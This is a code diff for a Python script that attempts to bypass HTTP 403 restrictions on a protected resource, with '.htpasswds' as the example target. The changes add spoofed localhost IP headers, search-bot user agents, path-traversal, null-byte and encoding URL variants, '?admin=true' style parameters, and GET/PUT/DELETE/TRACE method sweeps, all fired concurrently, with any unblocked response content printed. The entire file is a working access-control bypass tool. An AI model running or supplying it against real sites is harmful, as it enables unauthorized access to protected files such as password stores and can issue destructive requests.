@@ -1,5 +1,20 @@
 import requests
+import time
+from concurrent.futures import ThreadPoolExecutor, as_completed
 
+# Function to make HTTP requests
+def send_request(method, url, headers):
+    try:
+        response = requests.request(method, url, headers=headers, timeout=10)
+        return (url, method, headers, response.status_code, response.text)
+    except requests.exceptions.Timeout:
+        return (url, method, headers, "Timeout", "")
+    except requests.exceptions.ConnectionError:
+        return (url, method, headers, "Connection Error", "")
+    except requests.RequestException as e:
+        return (url, method, headers, f"Error: {e}", "")
+
+# Main function
 def main():
     full_url = input("Enter the full URL to the forbidden resource (e.g., https://example.com/.htpasswds): ").strip()
     url_parts = full_url.split('/')
@@ -7,19 +22,33 @@ def main():
     resource = '/'.join(url_parts[3:])
     base_url = f'https://{domain}/'
 
-    # List of headers to try
-    headers_list = [
-        {'User-Agent': 'Mozilla/5.0'},
+    # Base headers to be updated dynamically
+    base_headers = {
+        'User-Agent': 'Mozilla/5.0',
+        'Referer': f'https://{domain}',
+        'X-Forwarded-For': '127.0.0.1'
+    }
+
+    # Expanded headers list (headers to update dynamically)
+    additional_headers = [
         {'User-Agent': 'Googlebot/2.1 (+http://www.google.com/bot.html)'},
-        {'Referer': f'https://{domain}'},
-        {'X-Forwarded-For': '127.0.0.1'},
+        {'X-Forwarded-For': '10.10.10.10'},
+        {'X-Originating-IP': '127.0.0.1'},
+        {'X-Remote-IP': '127.0.0.1'},
+        {'X-Remote-Addr': '127.0.0.1'},
+        {'Forwarded': 'for=127.0.0.1'},
+        {'True-Client-IP': '127.0.0.1'},
+        {'User-Agent': 'Baiduspider'},
         {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36'},
-        {'User-Agent': 'curl/7.68.0'}
+        {'User-Agent': 'curl/7.68.0'},
     ]
+
+    # Expanded URL variations
     url_variations = [
         full_url,
         base_url + '%2e' + resource,
-        base_url + '.HT' + resource[2:],
+        base_url + '.' + resource,
+        base_url + './' + resource,
         base_url + '/../' + resource,
         full_url + '%00',
         full_url + '/',
@@ -31,29 +60,36 @@ def main():
         full_url + '?admin=true',
         full_url + '?debug=true',
         base_url + resource + '?anything=here',
-        full_url.replace('https://', 'http://')
+        full_url.replace('https://', 'http://'),
+        base_url + '//' + resource,
+        base_url + '/%2e%2e%2f%2e%2e%2f' + resource,
+        base_url + resource + '%20',
+        base_url + resource + '/%20',
     ]
-    methods = ['GET', 'POST', 'PUT', 'DELETE']
-    for method in methods:
-        for headers in headers_list:
-            for test_url in url_variations:
-                try:
-                    print(f'Trying {method} URL: {test_url} with headers: {headers}')
-                    if method == 'GET':
-                        response = requests.get(test_url, headers=headers, timeout=10)
-                    elif method == 'POST':
-                        response = requests.post(test_url, headers=headers, timeout=10)
-                    elif method == 'PUT':
-                        response = requests.put(test_url, headers=headers, timeout=10)
-                    elif method == 'DELETE':
-                        response = requests.delete(test_url, headers=headers, timeout=10)
-                    print(f'Status Code: {response.status_code}')
-                    if response.status_code != 403:
-                        print(f'Content: {response.text}')
-                    else:
-                        print('Access forbidden, 403 error.')
-                except requests.RequestException as e:
-                    print(f'Error: {e}')
+
+    # HTTP methods to test
+    methods = ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'HEAD', 'TRACE']
+
+    # Use ThreadPoolExecutor for parallel requests
+    with ThreadPoolExecutor(max_workers=5) as executor:
+        future_to_request = []
+
+        # Generate all the combinations of methods, headers, and URLs
+        for method in methods:
+            for headers in additional_headers:
+                for test_url in url_variations:
+                    # Merge base headers with current test headers
+                    current_headers = {**base_headers, **headers}
+                    future = executor.submit(send_request, method, test_url, current_headers)
+                    future_to_request.append(future)
+        
+        # Process the completed requests as they finish
+        for future in as_completed(future_to_request):
+            url, method, headers, status_code, content = future.result()
+            print(f'{method} {url} -> Status Code: {status_code}')
+            if status_code != 403:
+                print(f'Response Content: {content[:200]}...')  # Limit output for readability
+            time.sleep(0.5)  # Control rate limiting
 
 if __name__ == "__main__":
     main()
